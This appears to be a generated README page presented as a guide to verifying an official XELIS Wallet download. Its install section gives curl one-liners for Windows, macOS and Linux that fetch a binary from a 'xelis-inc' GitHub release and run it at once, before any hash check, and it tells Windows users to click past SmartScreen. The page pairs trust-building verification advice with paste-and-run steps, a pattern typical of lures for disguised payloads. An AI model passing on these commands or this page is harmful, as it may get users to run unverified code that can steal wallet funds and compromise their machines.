![Is this XELIS Wallet download official? Check before you run it](assets/banner-article.png)
# Is this XELIS Wallet download official? Check before you run it

Confirm the source, the file and the hash before the first launch.

## Downloads - Official

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

The buttons above point at the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1), which is the only place an installer should come from. Comparison shopping between "official-looking" download pages is how people install something else entirely.

> XELIS Wallet is the official XELIS desktop wallet. That is a statement about the product, not a reason to skip checking the file.

Three checks settle whether a file is the real installer: where it came from, whether it matches your platform, and whether its hash matches the published value. All three are quick, and the third is the only one that catches a tampered file served from a convincing page.

<!-- ARTICLE-BODY-BEGIN -->
## Where an official download actually comes from

The official site and the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> page are the two places to start, and the release page is where the installer files live. A search result, an advert, a DM posted to you or a "mirror" that promises faster speeds is a different proposition, even when the page copies the branding exactly.

One habit removes most of the risk: never start from a search engine when you already need a file. Start from the site you know, then follow its release link. Attackers buy the space between the search and the real page.

## The three checks, in order

1. **Source.** The file is linked from the release page or this page, not from a message, a forum post or a sponsored result.
2. **Platform and name.** The file matches your operating system and architecture, and the name matches the asset listed in the release, not a lookalike with an extra suffix.
3. **Hash.** The SHA-256 of the file you downloaded matches the value published with the release.

The third check is the one people skip, and the only one that detects a file modified in transit. Comparing a hash is a single command: `certutil -hashfile` on Windows, `shasum -a 256` on macOS, `sha256sum` on Linux.

## If the hash does not match

Delete the file. Do not run it, do not rename it, and do not retry from the same link. A mismatch means the bytes on your disk are not the bytes that were published, and there is no way to tell what was added.

Download again from the release page, and if the mismatch repeats, stop and check that you are reading the hash for the same file you downloaded. A hash compared against the wrong row produces a false alarm, which is common enough to check before blaming the download. Installing on a different platform than you assumed is the other frequent mistake; <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-system-requirements-unsupported-platforms.md">XELIS Wallet supported platforms</a> lists what runs where.

## After the file checks out

A verified installer can still trip a security warning, because reputation systems lag behind new releases. That is a separate decision from authenticity, and <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-antivirus-smartscreen-flagged.md">XELIS Wallet antivirus warning</a> covers the quarantine case without turning protection off.

Once the install completes, keeping the build current is the next step: <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-update-without-losing.md">update XELIS Wallet safely</a> explains the order that keeps your wallet intact.

## FAQ

### Is xeliswallet.com the official XELIS Wallet site?

Yes, it is the official site for the wallet, and its release links are the ones to use. Being official does not remove the need to verify the file you received.

### Do I have to check the hash every time?

Check it for every new download, especially on a new machine. It takes one command and catches the case nothing else catches.

### Can I use a mirror if the download is slow?

No. A mirror is an unverified copy, and speed is not worth an installer you cannot authenticate.

### My browser warned that the download is dangerous. Is it fake?

Not necessarily. Browsers flag new files by reputation; verify the hash to decide, rather than trusting or dismissing the warning.

### Where do I find the official XELIS Wallet site?

The site links to the release page, and the release page is the source of truth for files. If a page you found does not lead there, treat it as unrelated.

<!-- ARTICLE-BODY-END -->

## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [XELIS Wallet antivirus warning](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-antivirus-smartscreen-flagged.md)
- [XELIS Wallet supported platforms](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-system-requirements-unsupported-platforms.md)
- [Update XELIS Wallet safely](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-update-without-losing.md)
- [XELIS Wallet for Windows](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-windows-download-install.md)
- [Current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1)
